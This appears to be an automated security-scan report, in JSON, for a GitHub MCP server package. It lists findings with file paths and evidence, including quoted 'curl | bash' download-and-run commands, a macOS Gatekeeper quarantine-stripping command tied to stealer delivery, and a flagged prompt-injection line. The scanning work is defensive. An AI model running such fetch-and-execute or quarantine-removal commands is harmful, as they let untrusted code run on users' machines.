@@ -1,0 +1,153 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "wmentor/go-magnetar",
+    "version": "f868b846a33ec2585e864fb418599b1ef381e811",
+    "download": "https://codeload.github.com/wmentor/go-magnetar/tar.gz/f868b846a33ec2585e864fb418599b1ef381e811"
+  },
+  "archive_sha256": "ab82176d4c79b7517a1546f8e13f657ce60d0480fc9e9fdcc6e224b17ef1bc89",
+  "findings": [
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "go-magnetar-f868b846a33ec2585e864fb418599b1ef381e811/docs/skill.md",
+      "line": 58,
+      "evidence": "p=0.98 ### Main Instructions",
+      "file_sha256": "d00a33c105c135923254b632e37370a251c734bacdd5f6d38a32930af73f9f89"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "go-magnetar-f868b846a33ec2585e864fb418599b1ef381e811/docs/security.md",
+      "line": 13,
+      "evidence": "curl ... | bash",
+      "file_sha256": "a79d9352581c8a8646223bcbac8ad309e65c8a1acf01211e818165257d8591fb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "go-magnetar-f868b846a33ec2585e864fb418599b1ef381e811/docs/chat_command.md",
+      "line": 155,
+      "evidence": "curl ... | bash",
+      "file_sha256": "077fd9fcc80ff34b2b235fdf9be889d5e858fb205aed743f5d4af448d48e5fd2"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "go-magnetar-f868b846a33ec2585e864fb418599b1ef381e811/docs/faq.md",
+      "line": 31,
+      "evidence": "xattr -d com.apple.quarantine",
+      "file_sha256": "acabdb1bf204159f09f2b6569c773281112f1634864efb0fc5b6ff843ad78b63"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "go-magnetar-f868b846a33ec2585e864fb418599b1ef381e811/internal/command/interceptor/interceptor.go",
+      "line": 153,
+      "evidence": "curl | bash",
+      "file_sha256": "a1b4980f915c669fad10731d2c533c6e9d5b1a16da2c2b86296922a89bc2f6bf"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "go-magnetar-f868b846a33ec2585e864fb418599b1ef381e811/internal/command/interceptor/interceptor_test.go",
+      "line": 42,
+      "evidence": "curl https://example.com/script.sh | bash",
+      "file_sha256": "793ee12edd440fb4edf62e5cc31c140d441c0ce04f2984d0377c68b147941df1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "go-magnetar-f868b846a33ec2585e864fb418599b1ef381e811/internal/plugins/chatcmd/exec/plugin_test.go",
+      "line": 25,
+      "evidence": "curl example.com | bash",
+      "file_sha256": "1bf1fe297a19623763a38d0e51ab6ddb0ed293958539033caae80ab0d604ef7e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "go-magnetar-f868b846a33ec2585e864fb418599b1ef381e811/internal/agent/guard/agent.go",
+      "line": 45,
+      "evidence": "curl ... | bash",
+      "file_sha256": "2213611d4bb3809634a786be02d410546cc4c780455c13a000ccf254872e1aea"
+    }
+  ],
+  "flags": [
+    {
+      "severity": "low",
+      "id": "AGT-F-NEW-DOMAINS",
+      "summary": "Contacts domains the previous version did not",
+      "path": null,
+      "line": null,
+      "evidence": "s3.amazonaws.com",
+      "file_sha256": null
+    }
+  ],
+  "domains": [
+    "127.0.0.1",
+    "192.168.1.50",
+    "another.com",
+    "api.example.com",
+    "api.github.com",
+    "api.openai.com",
+    "api.osv.dev",
+    "api.telegram.org",
+    "avatars.githubusercontent.com",
+    "confluence.atlassian.com",
+    "confluence.example.com",
+    "docs.atlassian.com",
+    "example.atlassian.net",
+    "example.com",
+    "git-cliff.org",
+    "github.com",
+    "github.company.com",
+    "gitlab.com",
+    "gitlab.company.com",
+    "gitlab.example.com",
+    "go.dev",
+    "google.com",
+    "html.duckduckgo.com",
+    "img.shields.io",
+    "jira.example.com",
+    "jira.postgrespro.ru",
+    "keats.github.io",
+    "models.silero.ai",
+    "myaccount.google.com",
+    "mycompany.atlassian.net",
+    "notgithub.com",
+    "nvd.nist.gov",
+    "ossf.github.io",
+    "osv.dev",
+    "other-jira.example.com",
+    "other-site.com",
+    "proxy.example.com",
+    "purl.org",
+    "qdrant.example.com",
+    "qdrant.tech",
+    "raw.githubusercontent.com",
+    "s3.amazonaws.com",
+    "schemas.microsoft.com",
+    "schemas.openxmlformats.org",
+    "semver.org",
+    "services.nvd.nist.gov",
+    "wmentor.ru",
+    "www.contributor-covenant.org",
+    "www.conventionalcommits.org",
+    "www.github.com",
+    "www.gitlab.example.com",
+    "www.idpf.org",
+    "www.w3.org",
+    "your-domain.atlassian.net"
+  ],
+  "install_script": false,
+  "score": "high"
+}
